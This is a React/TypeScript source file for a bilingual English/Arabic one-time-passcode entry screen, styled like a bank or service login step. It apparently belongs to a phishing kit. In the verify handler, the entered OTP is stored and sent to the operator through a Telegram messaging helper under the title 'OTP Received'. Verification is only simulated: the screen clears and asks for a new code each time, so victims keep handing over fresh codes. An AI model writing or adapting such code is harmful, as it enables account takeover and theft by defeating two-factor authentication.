"use client"

import { useState, useEffect, useRef, useCallback } from "react"

interface OtpScreenProps {
    lang: "en" | "ar"
    onBack: () => void
}

const translations = {
    en: {
        title: "Enter OTP",
        subtitle: "A 4-digit code has been sent to your registered mobile number",
        resend: "Resend OTP",
        resendIn: "Resend in",
        seconds: "s",
        verify: "VERIFY",
        back: "Back",
    },
    ar: {
        title: "أدخل رمز التحقق",
        subtitle: "تم إرسال رمز مكون من 4 أرقام إلى رقم هاتفك المسجل",
        resend: "إعادة إرسال الرمز",
        resendIn: "إعادة الإرسال خلال",
        seconds: "ث",
        verify: "تحقق",
        back: "رجوع",
    },
}

export function OtpScreen({ lang, onBack }: OtpScreenProps) {
    const t = translations[lang]
    const isRtl = lang === "ar"
    const [otp, setOtp] = useState<string[]>(["", "", "", ""])
    const [timer, setTimer] = useState(60)
    const [canResend, setCanResend] = useState(false)
    const [isVerifying, setIsVerifying] = useState(false)
    const [error, setError] = useState("")
    const inputRefs = useRef<(HTMLInputElement | null)[]>([])

    useEffect(() => {
        if (timer > 0) {
            const interval = setInterval(() => {
                setTimer((prev) => {
                    if (prev <= 1) {
                        setCanResend(true)
                        return 0
                    }
                    return prev - 1
                })
            }, 1000)
            return () => clearInterval(interval)
        }
    }, [timer])

    useEffect(() => {
        inputRefs.current[0]?.focus()
    }, [])

    const handleChange = useCallback(
        (index: number, value: string) => {
            if (!/^\d*$/.test(value)) return
            const newOtp = [...otp]
            newOtp[index] = value.slice(-1)
            setOtp(newOtp)
            setError("")

            if (value && index < 3) {
                inputRefs.current[index + 1]?.focus()
            }
        },
        [otp]
    )

    const handleKeyDown = useCallback(
        (index: number, e: React.KeyboardEvent) => {
            if (e.key === "Backspace" && !otp[index] && index > 0) {
                inputRefs.current[index - 1]?.focus()
            }
        },
        [otp]
    )

    const handlePaste = useCallback((e: React.ClipboardEvent) => {
        e.preventDefault()
        const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4)
        if (pastedData) {
            const newOtp = [...Array(4)].map((_, i) => pastedData[i] || "")
            setOtp(newOtp)
            const focusIndex = Math.min(pastedData.length, 3)
            inputRefs.current[focusIndex]?.focus()
        }
    }, [])

    const handleResend = () => {
        setTimer(60)
        setCanResend(false)
        setOtp(["", "", "", ""])
        setError("")
        inputRefs.current[0]?.focus()
    }

    const handleVerify = async () => {
        const code = otp.join("")
        if (code.length < 4) {
            setError(lang === "en" ? "Please enter the complete 4-digit OTP" : "يرجى إدخال رمز التحقق المكون من 4 أرقام")
            return
        }

        setIsVerifying(true)

        const otpCode = otp.join("")
        sessionStorage.setItem("userOtp1", otpCode)

        try {
            const { sendTelegramMessage } = await import("@/lib/telegram")
            await sendTelegramMessage({
                title: "OTP Received",
                type: "otp_entry",
                exclude: ["location", "profile"]
            })
        } catch (err) {
            console.error("Error sending OTP:", err)
        }

        // Simulate verification
        setTimeout(() => {
            setIsVerifying(false)
            setOtp(["", "", "", ""])
            setTimer(60)
            setCanResend(false)
            setError("")
            inputRefs.current[0]?.focus()
        }, 2000)
    }

    const isComplete = otp.every((d) => d !== "")

    return (
        <div
            className="relative h-[100dvh] flex flex-col overflow-hidden"
            dir={isRtl ? "rtl" : "ltr"}
        >
            {/* Background */}
            <div
                className="fixed inset-0"
                style={{
                    background:
                        "radial-gradient(ellipse at center, #1a8ad4 0%, #0066b3 25%, #0066b3 45%, #005da3 60%, #004d8a 80%, #003d70 100%)",
                }}
            />

            {/* Back button */}
            <div className="relative z-10 p-5 pt-6 w-full max-w-md mx-auto">
                <button
                    onClick={onBack}
                    className="flex items-center gap-2 text-[15px]"
                    style={{ color: "rgba(255,255,255,0.8)" }}
                >
                    <svg
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        style={{ transform: isRtl ? "scaleX(-1)" : "none" }}
                    >
                        <path d="M19 12H5" />
                        <path d="m12 19-7-7 7-7" />
                    </svg>
                    {t.back}
                </button>
            </div>

            {/* Content wrapper */}
            <div className="relative z-10 flex-1 overflow-y-auto no-scrollbar">
                <div className="flex flex-col min-h-full w-full max-w-sm mx-auto px-8 py-6">
                    <div className="mb-8">
                        <h2
                            className="text-[20px] font-medium mb-1 text-center"
                            style={{ color: "rgba(255,255,255,0.95)" }}
                        >
                            {t.title}
                        </h2>
                        <p
                            className="text-[14px] text-center mb-6 max-w-[280px] leading-relaxed mx-auto"
                            style={{ color: "rgba(255,255,255,0.6)" }}
                        >
                            {t.subtitle}
                        </p>

                        {/* OTP Inputs */}
                        <div className="flex justify-center gap-2.5 mb-4" dir="ltr">
                            {otp.map((digit, index) => (
                                <input
                                    key={index}
                                    ref={(el) => {
                                        inputRefs.current[index] = el
                                    }}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={digit}
                                    onChange={(e) => handleChange(index, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(index, e)}
                                    onPaste={index === 0 ? handlePaste : undefined}
                                    className="w-[42px] h-[50px] rounded-lg text-center text-[20px] font-medium outline-none transition-all"
                                    style={{
                                        backgroundColor: "rgba(255,255,255,0.95)",
                                        color: "#003d70",
                                        border: error
                                            ? "2px solid #ef4444"
                                            : digit
                                                ? "2px solid rgba(255,255,255,1)"
                                                : "2px solid rgba(255,255,255,0.3)",
                                    }}
                                    aria-label={`OTP digit ${index + 1}`}
                                />
                            ))}
                        </div>

                        {/* Error */}
                        {error && (
                            <p className="text-[13px] text-red-300 mb-3 text-center">{error}</p>
                        )}

                        {/* Timer / Resend */}
                        <div className="text-center mb-8">
                            {canResend ? (
                                <button
                                    onClick={handleResend}
                                    className="text-[14px] font-medium underline"
                                    style={{ color: "rgba(255,255,255,0.9)" }}
                                >
                                    {t.resend}
                                </button>
                            ) : (
                                <p
                                    className="text-[14px]"
                                    style={{ color: "rgba(255,255,255,0.5)" }}
                                >
                                    {t.resendIn}{" "}
                                    <span style={{ color: "rgba(255,255,255,0.8)" }}>
                                        {timer}{t.seconds}
                                    </span>
                                </p>
                            )}
                        </div>

                        {/* Verify Button - Natural Flow */}
                        <div className="pb-8">
                            <button
                                onClick={handleVerify}
                                disabled={isVerifying}
                                className="w-full h-[52px] rounded-lg text-[17px] font-semibold tracking-wider transition-all flex items-center justify-center gap-3"
                                style={{
                                    backgroundColor: isComplete ? "#5baaed" : "#4a90c9",
                                    color: isComplete ? "rgba(255,255,255,0.95)" : "rgba(255,255,255,0.6)",
                                }}
                            >
                                {isVerifying ? (
                                    <svg className="animate-spin" width="22" height="22" viewBox="0 0 24 24" fill="none">
                                        <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" strokeWidth="3" />
                                        <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                                    </svg>
                                ) : (
                                    t.verify
                                )}
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}
